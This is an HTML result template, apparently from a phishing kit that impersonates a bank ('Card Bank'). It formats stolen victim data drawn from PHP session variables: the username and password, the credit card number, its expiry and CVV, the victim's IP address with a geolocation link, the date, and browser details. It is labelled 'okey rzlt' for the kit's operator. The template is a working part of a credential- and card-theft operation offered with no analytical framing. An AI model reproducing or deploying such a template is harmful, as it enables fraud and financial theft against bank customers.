<html><head>
</head>

<body><center>
<div style="font-size: 13px;font-family:monospace;font-weight:700;">
<font style="color: #820000;">Card Bank</font>
<br>
===================[ <font style="color: #ee2b3c;">Login INFORMATION</font> ]===================
<br>
<font style="color:#9c0000;"></font> [Nombre de usuario] = <font style="color:#f1ab3e;">".$_SESSION['_username_']."</font>
<br>
<font style="color:#9c0000;"></font> [Contrasena] = <font style="color:#f1ab3e;">".$_SESSION['_pass_']."</font>
<br>

===================[ <font style="color: #ee2b3c;">Card INFORMATION</font> ]===================

<br>
<font style="color: #ee2b3c;"></font> [NUMERO DE TARJETA DE CREDITO] = <font style="color: #f1ab3e;">".$_SESSION['_cardnumber_']."</font>
<br>
<font style="color:#9c0000;"></font> [Nombre Completo] = <font style="color: #f1ab3e;">".$_SESSION['_MM_']."/".$_SESSION['_YY_']."</font>
<br>
<font style="color:#9c0000;"></font> [CODIGO DE SEGURIDAD (CVV)] = <font style="color: #f1ab3e;">".$_SESSION['_CVC_']."</font>
<br>
[ <font style="color: #ee2b3c;">System</font> ]<br>
<font style="color:#9c0000;"></font> [IP INFO] = <font style="color:#0070ba;">
<a target="_blank" style="text-decoration:none;" href="http://www.geoiptool.com/?IP=&quot;.$_SERVER[" remote_addr']."'="">".$_SERVER['REMOTE_ADDR']." </a></font><br>
<font style="color:#9c0000;"></font> [TIME/DATE] = <font style="color:#0070ba;">".$InfoDATE."</font><br>
<font style="color:#9c0000;"></font> [BROWSER] = <font style="color:#0070ba;">".$browserTy_Version." and ".$OS."</font>
<br>
=======================[ <font style="color: #ee2b3c;">okey rzlt</font> ]=======================<br>
 <font style="color: #820000;"></font></div></center><font style="color: #820000;">

</font>

</body></html>